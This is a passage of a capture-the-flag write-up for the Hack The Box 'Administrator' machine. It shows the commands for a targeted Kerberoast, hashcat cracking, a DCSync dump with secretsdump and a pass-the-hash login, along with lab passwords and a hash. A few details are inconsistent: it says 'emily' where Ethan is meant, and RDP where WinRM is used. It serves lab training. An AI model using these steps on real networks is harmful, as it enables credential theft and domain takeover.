+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crackmapexec winrm 10.10.11.42 -u emily  -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb  </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>I log in to <em>winrm</em> using Emily&rsquo;s credentials and I get the user.txt flag.</p>
+<p><img src="/assets/images/HTB/Administrator/Admin9.png" alt="pass.txt"  loading="lazy" /></p>
+<h2>Targeted Kerberoast<span class="hx:absolute hx:-mt-20" id="targeted-kerberoast"></span>
+    <a href="#targeted-kerberoast" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Using <em>bloodHound</em> I mark Emily as &ldquo;owned&rdquo; and I can see that emily has the ability to perform a TargeterKerberoast
+attack to <strong>Ethan</strong>.
+<img src="/assets/images/HTB/Administrator/Admin10.png" alt="Emily Bloodhound"  loading="lazy" /></p>
+<h4>What is a targeted Kerberoast attack?<span class="hx:absolute hx:-mt-20" id="what-is-a-targeted-kerberoast-attack"></span>
+    <a href="#what-is-a-targeted-kerberoast-attack" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>Targeted Keberoasting attack is a technique that allows an attacker (with a vulnerable/owned account) that has a <strong>GenericAll, GenericWrite, WriteProperty or Validated-SPN permissions</strong> over another object to control multiple attributes of the attacked object such as SPN&rsquo;s.</p>
+<p>Adding a <em>non-existent</em> SPN to the user will allow the attacker to request a <em>service ticket (ST)</em> for the targeted account and from here it will be as a regular kerberoast attack. Requesting the new SPN will give us back a hash containing the user password.</p>
+<p>In simple words, the attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to regular a Kerberoasting attack.</p>
+<h3>Performing The Attack.<span class="hx:absolute hx:-mt-20" id="performing-the-attack"></span>
+    <a href="#performing-the-attack" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>I attempt to attach a non-existent SPN to Emily with <em>targetedKerberoast.py.</em></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> python3 targetedKerberoast.py -v -d <span class="s1">&#39;administrator.htb&#39;</span> -u <span class="s1">&#39;emily&#39;</span> -p <span class="s1">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span> </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/images/HTB/Administrator/Admin11.png" alt="Targeted Kerberoast"  loading="lazy" />.</p>
+<p>Using Hashcat I am able to crack the password for emily.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> ethan_hash /usr/share/wordlists/rockyou.txt --force </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/images/HTB/Administrator/Admin12.png" alt="cracking hash"  loading="lazy" />.</p>
+<ul>
+<li>ethan:limpbizkit</li>
+</ul>
+<h2>DCSync Attack.<span class="hx:absolute hx:-mt-20" id="dcsync-attack"></span>
+    <a href="#dcsync-attack" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>With CrackMapExec I verify is the credentials are valid.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crackmapexec smb 10.10.11.42 -u ethan -p limpbizkit --shares</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/images/HTB/Administrator/Admin13.png" alt="crackmapexec-ethan"  loading="lazy" />.</p>
+<p>By Checking Bloodhound and seeking for possible attacks to advance, I find out that Ethan have <strong>DCSync</strong> Privileges over the domain. <em>DCSync attack</em> is a type of attack that allows the attacker to <em><em>mimic</em> a legitimate domain controller (DC)</em> with the purpose of retrieving password data form the Active Directory environment.The attacker essentially tricks a DC into sharing password hashes, including the highly valuable KRBTGT hash, without needing a foothold on the DC itself.</p>
+<p><img src="/assets/images/HTB/Administrator/Admin14.png" alt="Bloodhound-Ethan"  loading="lazy" />.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump <span class="s1">&#39;administrator.htb&#39;</span>/<span class="s1">&#39;ethan&#39;</span>:<span class="s1">&#39;limpbizkit&#39;</span>@10.10.11.42</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/images/HTB/Administrator/Admin15.png" alt="Bloodhound-Ethan"  loading="lazy" />.</p>
+<p>login with RDP to the machine and get the root flag.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm  -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h2>References:<span class="hx:absolute hx:-mt-20" id="references"></span>
+    <a href="#references" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><ul>
+<li><a href="https://bloodhound.specterops.io/resources/edges/generic-all" target="_blank" rel="noopener">https://bloodhound.specterops.io/resources/edges/generic-all</a></li>
+<li><a href="https://bloodhound.specterops.io/resources/edges/force-change-password" target="_blank" rel="noopener">https://bloodhound.specterops.io/resources/edges/force-change-password</a></li>
+<li><a href="https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/" target="_blank" rel="noopener">https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/</a></li>
+<li><a href="https://trustmarque.com/resources/what-is-targeted-keberoasting/" target="_blank" rel="noopener">https://trustmarque.com/resources/what-is-targeted-keberoasting/</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting</a></li>
+<li><a href="https://www.semperis.com/blog/dcsync-attack/" target="_blank" rel="noopener">https://www.semperis.com/blog/dcsync-attack/</a></li>
+</ul>
+
+        </div>
+        <div class="hx:mt-16"></div>
+        <div class="hx:mt-16"></div>
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div
+      class="hextra-custom-footer hx:max-w-screen-xl hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"
+    ></div><div
+        class="hx:max-w-screen-xl hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+      >
+        <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Powered by Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div><div class="hx:mt-6 hx:text-xs">© 2025 Hextra Project.</div></div>
+      </div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script>
+        <script defer src="/en.search.js" integrity=""></script>
+  </body>
+</html>
